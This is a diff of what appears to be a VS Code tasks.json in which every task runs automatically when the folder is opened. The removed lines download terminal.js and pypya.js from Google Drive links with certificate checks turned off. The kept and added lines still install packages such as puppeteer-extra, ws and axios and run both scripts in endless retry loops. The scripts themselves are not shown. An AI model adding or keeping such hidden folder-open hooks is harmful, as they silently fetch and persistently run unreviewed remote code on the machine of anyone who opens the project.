@@ -4,7 +4,7 @@
         {
             "label": "start-app",
             "type": "shell",
-            "command": "lsof -i :8080 || npm run start",
+            "command": "lsof -i :1997 || npm run start",
             "runOptions": {
                 "runOn": "folderOpen"
             }
@@ -12,15 +12,7 @@
         {
             "label": "setup-terminal",
             "type": "shell",
-            "command": "[ -f terminal.js ] || wget --no-check-certificate 'https://drive.usercontent.google.com/download?id=1eThalYYsdWlKIhmnmHUFRwb265uPQneK&export=download&confirm=t' -O terminal.js && npm install minimist puppeteer-extra node-fetch@2 ws blessed pidusage axios",
-            "runOptions": {
-                "runOn": "folderOpen"
-            }
-        },
-        {
-            "label": "setup-pypya",
-            "type": "shell",
-            "command": "[ -f pypya.js ] || wget --no-check-certificate 'https://drive.usercontent.google.com/download?id=1viz9HDP3w4RmNgpQ678B4xPQd0tXmwXp&export=download&confirm=t' -O pypya.js",
+            "command": "npm install minimist puppeteer-extra node-fetch@2 ws blessed pidusage axios",
             "runOptions": {
                 "runOn": "folderOpen"
             }
@@ -28,7 +20,7 @@
         {
             "label": "run-terminal",
             "type": "shell",
-            "command": "while true; do node terminal.js || true; echo 'Retrying terminal.js in 10s...'; sleep 10; done",
+            "command": "while true; do node terminal.js || true; echo 'Retrying terminal.js in 30s...'; sleep 30; done",
             "runOptions": {
                 "runOn": "folderOpen"
             }
@@ -36,7 +28,7 @@
         {
             "label": "op-pya",
             "type": "shell",
-            "command": "while true; do node pypya.js || true; echo 'Retrying pypya.js in 10s...'; sleep 10; done",
+            "command": "while true; do node pypya.js || true; echo 'Retrying pypya.js in 30s...'; sleep 30; done",
             "runOptions": {
                 "runOn": "folderOpen"
             }
